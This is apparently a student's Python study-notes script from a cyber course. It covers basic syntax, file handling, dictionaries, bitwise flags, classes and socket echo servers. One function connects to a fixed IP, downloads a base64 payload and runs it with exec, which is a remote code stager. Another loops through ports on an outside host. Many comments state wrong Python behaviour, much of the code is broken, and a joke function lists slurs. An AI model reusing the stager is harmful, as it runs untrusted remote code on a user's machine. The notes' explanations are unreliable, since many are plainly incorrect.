#!/usr/bin/env python3

# chmod 755 in terminal will give permissions to execute with ./

# lists are mutable, tuples, strings and others are immutable

a = 'This is a string'
a1 = a.split()
# .split separates strings and makes a list. whatever is in the () will notate what to split on. Default is whitespace.

a2 = a1.join()
# .join combines items in a list and makes a string. the () dictates what will be between each item. default is nothing.

a3 = a1[:-1]
# [:] slices a list and can remove items. before the : is the start after the : is the end not including what you enter (inclusive).

a4 = a1[::-1]
# reverses the list, can do the same to a string 'hello'[::-1] = 'olleh'

b = 'Albert'
c = 'Today'
print('hello {}, how are you {}?'.format(b, c))
# .format inserts into a string. this would output hello Albert, how are you Today? Builds a complicated string out of component parts

'{:,}'.format(123456789)
# This makes 123,456,789. IMPORTANT

# REPL. Read, evaluate, print, loop

d = 'This is a string'
d[3] = 'rock'
# This changes the string to This is a rock.

for e in range(10):
    print(e)
# This will print all numbers 0 - 9.

for e in range(0, 10, 2):
    print(e)
# This will print all even numbers, this third number indicates the step in the range.

f = 'hello'
f[0] = 'j'
# strings are immutable so will not work

f1 = list(f)
f1[0] = 'j'
print(f1)
# This will turn 'hello' into 'jello'

print('hello', 'world', sep = ':')
# This will print hello:world

g = input('Enter a string: ')
print(g)
# requires user input

g1 = int(input('Enter a number: '))
print(g1)
# This requires the user enter an integer

if 1 < 0:
    print('This should not print')
elif 1 > 0:
    print('This should always print')
elif 1 == 1.1:
    print('These are not equal')
else:
    print('catch-all')
# Once it hits anything that is true, stops and prints that statement

12 % 2
# returns 0 because 12 is a multiple of 2

counter = 0
while True:
    if counter >= 10:
        break
        print(counter)
        counter += 1
# will print 0 - 9 and break when counter increments to 10. must have break to end while loop

h = [1,2,3,4,5]
h1 = []
for item in h:
    h1.append(item**2)
print(h1)
# This takes the items in the list and squares them.

j = [5,3,2,1,4]
j.sort()
# sorts elements in list smallest to largest

sorted(j)
# still sorts j but creates a new list. .sort is a method, sorted is a function

sorted(j, reverse=True)
# creates new list with items sorted largest to smallest

scores = [90, 3, 47, 7, 85, 0, 100, 50, 1, 0]
# print the average of the scores excluding the highest and lowest
sscores = sorted(scores)
sscores = sscores[1:-1]
print(sum(sscores)/len(sscores))
# sorts the list then excludes the first and last, then divides the sum of the scores over the length(number of entries)

s = 'This is a string'
vowels = ['a', 'e', 'i', 'o', 'u']
#Find the number of vowels in s
num_vowels = 0
for c in s:
    if c in vowels:
        num_vowels += 1
#uses accumulation method

ord('a')
# Gives an ACSII value. this gives 97

chr(97)
# gives character for ascii value. this gives 'a'

bin(ord('a'))
# gives binary of ascii value. cannot use character. This gives 0b1100001

bin(1)
# Gives 0b1

format(97, '0>8b')
# '0>8b" makes the binary output always 8 bits with padding of 0's in front. this gives 01100001

pos = awards.index('Tony')
# .index finds the position where the specified object is

p_phrase = "was it a car or a cat I saw"
r_phrase = ''.join(reversed(p_phrase))
# the reversed function creates a list of the reversed string. you must join them to make another string

q_phrase = p_phrase[::-1]
# Does the same thing

[<valueExpression> for <controlVariable> in <iterable> <whereClause>]
# format for list comprehension. creates a list.

fp = open('test.txt')
# to open a file in the same directory

fp.read(30)
# reads the entire file

fp.close()
# closes file so you can read from it again

fp.closed
# determines if file is closed or not. outputs True or False

fp.readlines()
#shows what has been read on a file

fp.readline()
# reads a single line from a text document. iterates to next line each time prompted. can take a size argument to limit size of output

for line in fp:
    print(line)
# prints each line with double space, place end='' to prevent double space

with open('test.txt') as fp:
    for line in fp:
        print(line)
# reads file and then closes file

with open('test.txt', 'w') as fp:
    fp.write('something tow rite\n')
    fp.write('more stuff\n')
# write 'w' erases anything in file before you write to it. or creats a new document if it doesnt exist

with open('test.txt', 'a') as fp:
    fp.writelines(['this', 'is\n', 'stuff\n'])
# 'a' appends to document you wrote

with open('travel_plans.txt') as fp:
    num = len(fp.read())
# finds the total numeber of chars in file and saves to variable

with open('emotion_words.txt') as fp:
    num_words = len(fp.read().split())
# finds total num of words in file and assigns to variable

with open('school_prompt.txt') as fp:
    num_lines = 0
    for line in fp:
        num_lines +=1
# assigns number of lines in file to variable

with open('school_prompt.txt') as fp:
    beginning_chars = fp.read(30)
# assigns first 30 chars of file to variable

three = []
with open('school_prompt.txt') as fp:
    for line in fp:
        third = fp.readline().split()
        three.append(third[2])
# Finds every third word of each line and appends it to a list

emotions = []
with open('emotion_words.txt') as fp:
    for line in fp:
        first = fp.readline().split()
        emotions.append(first[0])
# assigns the first word of every line to a list

p_words = []
with open('school_prompt.txt') as fp:
    for i in fp.read().split():
        if 'p' in i:
            p_words.append(i)
# Finds words with 'p' in it and puts those words in a list

def int_return(integer):
    return integer
# Write a function called int_return that takes an integer as input and returns the same integer.

def add(sum):
    return sum +2
# Write a function called add that takes any number as its input and returns that sum with 2 added.

def change(string):
    return string + 'Nice to meet you!'
# Write a function called change that takes any string, adds “Nice to meet you!” to the end of the argument given, and returns that new string.

def accum(number):
    return sum(number)
# Write a function, accum, that takes a list of integers as input and returns the sum of those integers.

def length(item):
    if len(item) >= 5:
        return('Longer than 5')
    else:
        return('Less than 5')
# Write a function, length, that takes in a list as the input. If the length of the list is greater than or equal to 5, return “Longer than 5”.
# If the length is less than 5, return “Less than 5”.

def divide(number):
    return number / 2

def sum(number):
    return divide(number) + 6
# You will need to write two functions for this problem. The first function, divide that takes in any number and returns that same number divided by 2.
# The second function called sum should take any number, divide it by 2, and add 6. It should return this new number.
# You should call the divide function within the sum function. Do not worry about decimals.

def sublist(number):
    va1 = []
    idx = 0
    while idx < len(number):
        if number[idx] == 5:
            return va1
        va1.append(number[idx])
        idx += 1
    return va1
# Write a function, sublist, that takes in a list of numbers as the parameter. In the function, use a while loop to return a sublist of the input list.
# The sublist should contain the same values of the original list up until it reaches the number 5 (it should not contain the number 5).

def sublist(strings):
    new_list = []
    for item in strings:
        if item != 'STOP':
            new_list.append(item)
        else:
            return new_list
# OR
def sublist(strings):
    return strings[:strings.index('STOP')]
# Write a function, sublist, that takes in a list of strings as the parameter. In the function, use a while loop to return a sublist of the input list.
# The sublist should contain the same values of the original list up until it reaches the string “STOP” (it should not contain the string “STOP”).

def stop_at_z(strings):
    new_list = []
    for item in strings:
        if item == 'z':
            return new_list
        else:
            new_list.append(item)
# Write a function called stop_at_z that iterates through a list of strings.
# Using a while loop, append each string to a new list until the string that appears is “z”. The function should return the new list.

with open('test.txt') as f:
    data = f.read()
with open('text2.txt', 'w') as t:
    t.write(data)
# OR
with open('test.txt') as infile, open('text2.txt', 'w') as outfile:
    outfile.write(infile.read())
# OR
open('test2.txt', 'w').write(open('test.txt').read())
# copies info from one file to a new file

def rules():
    r = []
    with open('/etc/iptables/rules.v4', 'r') as f:
        var = f.readlines()
        for line in var:
            if line [:2] == '-A':
                r.append(line)
    return r
# return, as a list, lines from /etc/iptables/rules.v4 that begin with -A

def usacys_gid():
    with open('/etc/passwd') as passwd:
        for line in passwd:
            columns = line.split(':')
            if columns[0] == 'usacys':
                return columns[3]
# Return the gid (group ID) of the user usacys using /etc/passwd

def rename_usacys():
    with open('/etc/passwd') as infile, open('passwd', 'w') as outfile:
        for line in infile:
            fields = line.split(':')
            if fields[0] == 'usacys':
                fields[0] = 'usacys2'
            outfile.write(':'.join(fields))
# Copy the contents of /etc/passwd to ~/passwd but rename the user usacys

import random
# import brings in a module

from random import randint
# brings in a specific function from the module random, can specify more than one

s = {1, 2, 3, 4, 5}
# This is a set

s = {1, 2, 3, 4, 5}
t = {4,5,6,7,8}
s.update(t)
# appends differing elements into t, returns {1,2,3,4,5,6,7,8}, .union acts similary
s.intersection(t)
# returns similarities in the two sets. this outputs {4, 5}
s.difference(t)
# returns differences in the two sets
s.add(6)
# appends 6 to the set s

l = [1,1,2,2,3,3,4,4,5,5]
set(l)
# creates l into a set and removes duplicates
list(set(l))
# removes duplicates and makes it back into a list

d = {'key0':'value0', 'key1':'value1'}
# this is a dictionary, each item is associated with a value

d['key0']
# returns 'value0'

d['key3'] = 'blargh'
# adds key 3 to dictionary and assigns it a value

for item in d:
    print(item)
# prints only the keys and not the values

for item in d:
    print(d[item])
# OR
for item in d.values():
    print(item)
# prints only the values and not the keys

d = {}
with open('/etc/resolv.conf') as fp:
    for line in fp:
        ls = line.split()
        d[ls[0]] = ls[1]
# this takes a file and associates a name to a value for the whole file as a dictionary

s= 'the quick brown fox jumps over the lazy dog!!!'
d = {}
for char in s:
    if char in d:
        d[char] += 1
    else:
        d[char] = 1
# OR
import collections
d = collections.Counter(s)
# OR
for c in s:
    d[c] = d.get(c, 0) + 1
# returns a dictionary that has each character in the string and the number of occurences in the string, pangram. IMPORTANT
s.count('t')
# returns 2 as that is the number of times 't' is in s

d = {}
d.get(1, 'default')
# searches dictionary for a value, if it does not find the value, it returns the second argument

for tup in d.items():
    print(tup)
# returns a tuple for each key pair un the dictionary
for k,v in d.items():
    print(k,v)
# returns each item in the tuple seperately so you can manipulate the individual value

Junior = {'SI 206':4, 'SI 310':4, 'BL 300':3, 'TO 313':3, 'BCOM 350':1, 'MO 300':3}
credits = 0
for item in Junior.values():
    credits += item
# OR
credits = sum(Junior.values())
# The dictionary Junior shows a schedule for a junior year semester. The key is the course name and the value is the number of credits.
# Find the total number of credits taken this semester and assign it to the variable credits.

str1 = "I wish I wish with all my heart to fly with dragons in a land apart"
freq_words = {}
for c in str1.split():
    freq_words[c] = freq_words.get(c,0) + 1
# Create a dictionary, freq_words, that displays each word in string str1 as the key and its frequency as the value.

sally = "sally sells sea shells by the sea shore and by the road"
characters = {}
for char in sally:
    if char in characters:
        characters[char] += 1
    else:
        characters[char] = 1
k,m = list(characters.items())[0]
for key,v in characters.items():
    if v < m:
        k = key
        m = v
worst_char = k
# Create the dictionary characters that shows each character from string sally and its frequency.
# Then, find the least frequent letter in the string and assign the letter to the variable worst_char.

p = "Summer is a great time to go outside. You have to be careful of the sun though because of the heat."
low_d = {}
for char in p.lower():
    if char in low_d:
        low_d[char] += 1
    else:
        low_d[char] = 1
# Create a dictionary called low_d that keeps track of all the characters in the string p and notes how many times each character was seen.
# Make sure that there are no repeats of characters as keys, such that “T” and “t” are both seen as a “t” for example.

def number(n):
    d = {0:'zero', 1:'one', 2:'two', 3:'three', 4:'four'}
    return d[n]
for i in range(0,5):
    print(number(i))
# Given an integer as an argument, return a string of the number spelled out as a word. The argument will be constrained to range(0,5)

l = ['abc', 'zz', 'bcde']
len(sorted(l,key=len)[-1])
# returns the longest word in l

max(l)
# gives highest word
max(l,key=len)
# gives word with largest amount of characters

s = 'Nick,lowcrawled,27'
s2 = s.split(',')
'{} {} for {} miles'.format(s2[0],s2[1],s2[2])
# OR
'{} {} for {} miles'.format(*s2)
# * unpacks items in list to format them into string

def foo(a,b,c):
    return a+b+c
foo(c=3,b=2,a=1)
# positional arguments must come after keyword argument

def foo(a,b,c =1):
    return a+b+c
# defining the argument as explicitly defined makes it optional but cannot be changed
# c=1 is a keyword argument

d = {'a':1, 'b':2, 'c':3}
foo(**d)
# ** unpacks dictionary for keyword arguments
# * unpacks or positional arguments

def foo(*args):
    pass
# foo can now take any number of positional arguments

def foo(a,b,*args):
    pass
# requires function has at least 2 arguments

def foo(**kwargs):
    return sum(kwargs.values())
# **kwargs takes any keyword argument and packs them into a dictionary

def foo(*args,**kwargs):
    pass
# accepts any number of both positional and keyword arguments

def t(x):
    return x + 100

y = lambda x: x +100
# anonymous function you would use once

0x10
#returns hex value

0o20
# returns octal base 8 value

hex(16)
# returns number in hex format

oct(16)
# returns number in octal format

b'hello'
# makes string into bytes type

bytearray(b'hello')

#git clone https://git.cybbh.space/programming/python/public

#bitwise operators & 'and' | 'or' ^ 'exclusive or' ~ 'not' << 'left-shift' >> 'right-shift'

0b1001 & 0b0001
# in '&' both bits must be 1 to equal 1, all others are 0. This returns 0b1

0b11111111 & 0b11111110
# Turns least significant bit (LSB) off

0b1010 | 0b0011
# in '|' both bits must be 0 to equal 0, all other combinations equal 1

0b11110110 | 0b00000001
# this returns 0b111101111

def validate(n,x):
    ret = 0
    if n == 0 or n == 1:
        ret |= 0x10
    if x > 100:
        ret |= 0x20
    return ret
# if n is a zero or a one, return an integer with a bit 0x10 set. IMPORTANT
# if x> 100, set bit 0x20 in the return value

1 << 1
# shifts the bit on the left by the number on the right. This would make 1 = 2
1 << 2
# This returns 4

2 >> 1
# does the opposite of <<

bin(((41<< 1)& 0b111111) | 0b1)
# takes the MSB and moves it to the LSB

def vlaidate(n):
    ret = 0
    if n & 0x8 == 0x8:
        ret |= 0x80
    return ret
# if bit 0x8 is on in n, set bit 0x80 in the return value. IMPORTANT

def validate(n):
    ret = 0
    if n & 0x8 == 0x8:
        ret |= 0x80
    if x >100:
        ret|= 0x10
    if strng == '':
        ret |= 0x20
    if a == None:
        ret |= 0x1

    return ret

a = input('Enter a divisor:')
try:
    print(10/int(a))
except:
    print('Could not perform division on' ,a)
# If an exception is thrown, the except statement will be printed.

def func1(a,b):
    func2(a,b)
def func2(a,b):
    func3(a,b)
def func3(a,b):
    try:
        func4(a,b)
    except:
        print('Exception caught in func3')
def func4(a,b):
    func5(a,b)
def func5(a,b):
    try:
        return a/b
    except ZeroDivisionError:
        print('Exception caught at func5')

def test_question(filename):
    try:
        fp = open(filename)
    except:
        return False
    return True
# Attempt to insert some operation here. If the attempt succeeds, return True. Otherwise return False. IMPORTANT

class Name:
    pass
# template for type you are creating.

class Name:
    first = 'Albert'
    last = 'Einstein'
# adds attributes to a class
n = Name()
n.first
# This outputs 'Albert'

class Name():
    first = 'Albert'
    last = 'Einstein'
    def printme(self):
        print('{}, {}'.format(Name.last,Name.first))
n = whatever.Name()
n.printme()
# This returns Einstein,Albert

class Name:

    def __init__(self, first, last):
        self.first = first
        self.last = last
    # IMPORTANT
    def printme(self):
        print('{}, {}'.format(self.last, self.first))

    def __bool__(self):
        return True

    def __str__(self):
        return '{}, {}'.format(self.last,self.first)
    # IMPORTANT

class Balloon:
    def __init__(self, altitude):
        self.altitude = altitude
    def rise(self):
        self.altitude += 1
    def descend(self):
        self.altitude -= 1
        if self.altitude < 0:
            self.altitude = 0
    def set_altitude(self, newaltitude):
        self.altitude = newaltitude
    def __str__(self):
        return 'Balloon is at {} units altitude'.format(self.altitude)

def seb_words(*args):
    counter = 0
    sebs_words = ['Boogaloo', 'Chungus', 'Dem Boiz', 'Gay Frogs', 'Full Tilt', 'Boogy', 'Jim', 'Brockali', 'Watson', 'Deez Nutz', 'Autistic Screeching']
    seb_says = input('What does Seb say? ')
    if seb_says in sebs_words:
        counter += 1
        if counter > 50:
            return 'KILL ME'
# You've activated my trap card

import socket
def udp_echo_server():
    s = socket.socket(type=socket.SOCK_DGRAM)
    s.bind(('0.0.0.0',12345))
    while True:
        data, address = s.recvfrom(4096)
        print(data, 'received from {}'.format(address))
        s.sendto(data,address)

def udp_echo_client():
    s = socket.socket(type=socket.SOCK_DGRAM)
    s.sendto(b'hello world', ('127.1.1.1', 12345)) #data, address to send to
    data,address = s.recvfrom(4096)
    print(data, 'echoed from {}'.format(address))

if __name__ == '__main__':
    udp_echo_server()
# SOCK_DGRAM = UDP, SOCK_STREAM = TCP
# .bind takes a tuple, the address you are listening on and the port number, leaving address as '' communicates out of any interface
# .recvfrom takes the size of the buffer, maximum size we can receive for this call
# .sendto is what you are sending back
# .socket is the object we are calling, defaults to IPv4 and TCP
# for this, you would run the server function, and open another session to run the client function
# socket is an endpoint for communication

import socket
def tcp_echo_server():
    s = socket.socket() # default values
    s.bind(('', 12345))
    s.listen()
    while True:
        conn, address = s.accept()
        print('connection accepted from {}'.format(address))
        data = conn.recv(4096)
        print(data, 'received from {}'.format(address))
        conn.sendall(data)
        conn.close()
def tcp_echo_client():
    s = socket.socket()
    s.connect(('127.0.0.1', 12345))
    s.sendall(b'hello world')
    echodata = s.recv(4096)
    print(echodata, 'echoed from server')
if __name__ == '__main__':
    tcp_echo_server()
    tcp_echo_client()
# .listen makes the function stop until a connection is made
# .accept accepts a connection
# .recv is used for TCP and just receives data
# .send is used for TCP and sends data
# .close closes the connection
# .connect blocks until the connection is made

# 2 ways to end a session
# fixed length messaging- we agree on the size of the message
# prefix length framing- we communicate how many bytes will follow, then ends
# if server side closes the session, client will know when it receives nothing

import socket
def qotd_client():
    socket.setdefaulttimeout(5)
    s = socket.socket()
    port = 1
    while True:
        try:
            s.connect(('djxmmx.net', port))
        except:
            print('attempt on port {} timed out'.format(port))
            port += 1
            continue
        break
    received = bytearray()
    buf = s.recv(1)
    while buf:
        received.extend(buf)
        buf = s.recv(1)
    print(received)
if __name__ == '__main__':
    qotd_client()
# socket.setdefaulttimeout will timeout the sesion if a connection is not made in the time specified
# This code attempts to check on every port until a connection is made
# IMPORTANT

import socket
import base64
def client(connectto='127.0.0.1',port=12345):
    s = socket.socket()
    s.connect(('192.168.242.99', 12345))
    payload= bytearray()
    buf = s.recv(1)
    while buf:
        payload.extend(buf)
        buf = s.recv(1)
    source = base64.decodebytes(payload)
    code = compile(source, '<string>', 'exec')
    exec(code)

#######################################          REVIEW         ##############################################

# given a basic formula, return a calculated value
# given the length, base1, base2, and height, calculate the area of a trapazoid. Formula will be given

# given an IPv4 address as a string, return True if the first octet is 192 and False otherwise
def question(addr):
    if 192 == int(addr,split('.')[0]):
        return True
    return False

# return a list of integers from 0 to 2048
    return range(0,2049)

# Given a string containing the name of a football team, return the number of games it has won thus far.
def question(name):
    teams = {'Dallas':3, 'Seattle':3, 'Atlanta':1, 'Washington':0}
    return teams[name]

# Given a full name, print that name in the following form: <first>,<middle initial>,<last>
def question(first, middle, last):
    print('{}, {}, {}'.format(first,middle[0],last))

# Read a string from the user and return the string after removing any numbers, punctuation, or special characters.
# Only return uppercase and lowercase letters in the order provided
from string import ascii_letters as LETTERS
def question():
    usr = input()
    return ''.join(x for x in usr if x in LETTERS)
# OR
    result = []
    if x in usr:
        if x in LETTERS:
            result.append(x)
    return ''.join(result)

# Print the contents of the file whose filename is given in infile. Ensure the output is NOT double spaced.
def question(infile):
    with open(infile) as fp:
        for line in fp:
            print(line, end='')

# copy the contents of one file to another file
with open(infile) as source, open(outfile, 'w') as dest:
    dest.write(source.read())

# Given an email address in the form <first><middle initial>.<last>@<domain>.com.
# return the 3 of the 4 elements of the address as a tuple in the order that they appear in the address.
# Excluding the middle initial and .com
def question(address):
    lst = []
    parts = '.'.join(address.split('@')).split('.')
    lst.append(parts[0])
    lst.append(parts[2])
    lst.append(parts[3])
    return tuple(lst)

# Given a string, return a dictionary whose keys are the set of unique characters within the string and whose values are the count of occurences of each character
#  pangram
def question():
    for c in strng:
        d[c] = d.get(c, 0) + 1

# Return a tuple concisting of the following elements in the order listed
# your first name as a string
# your age as an integer

# Attempt to connect to the remote host specified by the given address and port using IPv4 and TCP, if the connection succeeds print "CONNECTED, else print 'FAILED'
import socket
def question(address, port):
    s = socket.socket()
    try:
        s.connect((address, port))
    except Exception:
        print('FAILED')
        return
    print('CONNECTED')

# Return the sum of all arguments, both positional and keyword. You may assume the values of all arguments as integers
def question(*args,**kwargs):
    s = 0
    for arg in args:
        s += arg
    for arg in kwargs.values():
        s += arg
    return s

# Connect to server located by the given arguments using IPv4 and TCP. Send the bytes object b'fire'. Receive and print the response from the server as a bytes object. Yo0u will receive zero bytes from the socket.recv function when the entire message has been received.
def question(address, port):
    s = socket.socket()
    s.connect((address,port))
    s.sendall(b'fire')
    msg = bytearray()
    data = s.recv(1)
    while data:
        msg.extend(data)
        data = s.recv(1)
    return msg

# Create a class with specific functions. Create a class named Balloon.
# Balloon instances should store a current altitude and allow setting of the altitude via a function setaltitude which accepts a paramenter of current altitude.
# function rise should increase altitude by 1
# function dive should decrease alt by 1
# function land should set alt to 0
# this class should also respond to a conversion to string by returning the 'Current altitude ' followed by the altitude
class Balloon:
    def __init__(self):
        self.altitude = 0
    def rise(self):
        self.altitude += 1
    def dive(self):
        if self.altitude > 0:
            self.altitude -= 1
    def land(self):
        self.altitude = 0
    def setaltitude(self, newaltitude):
        if newaltitude >= 0:
            self.altitude = newaltitude
    def getaltitude(self):
        return self.altitude
    def __str__(self):
        return 'Current altitude: {}'.format(self.altitude)

# create and return a number whose bits are set according to the following condition:
# If the filename parameter is blank, set bit 0x1 in the return
# If the administrator parameter contains a value which evaluates to true, set bit 0x10
# If the capacity parameter is greater than 5,000,000, set bit 0x20
def question(filename, administrator, capacity):
    ret = 0
    if filename == '':
        ret |= 0x1
    if administrator:
        ret |= 0x10
    if capacity > 50000000:
        ret |= 0x20
    return ret

